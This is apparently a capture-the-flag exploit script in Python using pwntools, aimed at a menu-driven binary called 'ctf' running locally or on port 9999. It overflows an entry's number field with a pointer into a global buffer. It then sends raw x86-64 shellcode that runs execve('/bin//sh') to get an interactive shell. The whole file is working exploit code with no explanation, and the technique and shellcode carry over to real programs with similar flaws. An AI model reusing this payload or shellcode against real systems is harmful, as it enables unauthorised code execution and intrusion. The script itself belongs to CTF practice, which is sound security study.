#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./ctf")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./ctf")
    libc = elf.libc


else:
    io = remote("127.0.0.1", 9999)
    libc = ELF("./libc-2.23.so.x86_64")


def DEBUG():
	raw_input("DEBUG: ")
	gdb.attach(io)

def listEntry():
    io.sendlineafter("Exit\n", "1")

def add(name, number):
    io.sendlineafter("Exit\n", "2")
    io.sendlineafter(": ", name)
    io.sendlineafter(": ", number)

def edit(idx, name, number):
    io.sendlineafter("Exit\n", "3")
    io.sendlineafter(": ", str(idx))
    io.sendlineafter(": ", name)
    io.sendlineafter(": ", number)

def delete(idx):
    io.sendlineafter("Exit\n", "4")
    io.sendlineafter(": ", str(idx))

if __name__ == "__main__":
    add('n' * 32, '1' * 24)
    add('n' * 32, '2' * 24)
    #  sc = asm(shellcraft.execve("/bin/sh"))
    payload = '1' * (24 + 8) + p64(elf.sym['buf'] + 8)
    #  DEBUG()
    edit(1, 'n' * 32, payload)

    sc = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf"
    sc += "\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54"
    sc += "\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
    print len(sc)
    print disasm(sc)

    #  DEBUG()
    payload = '2'.ljust(8, ' ') + sc
    delete(payload)

    io.interactive()
    io.close()
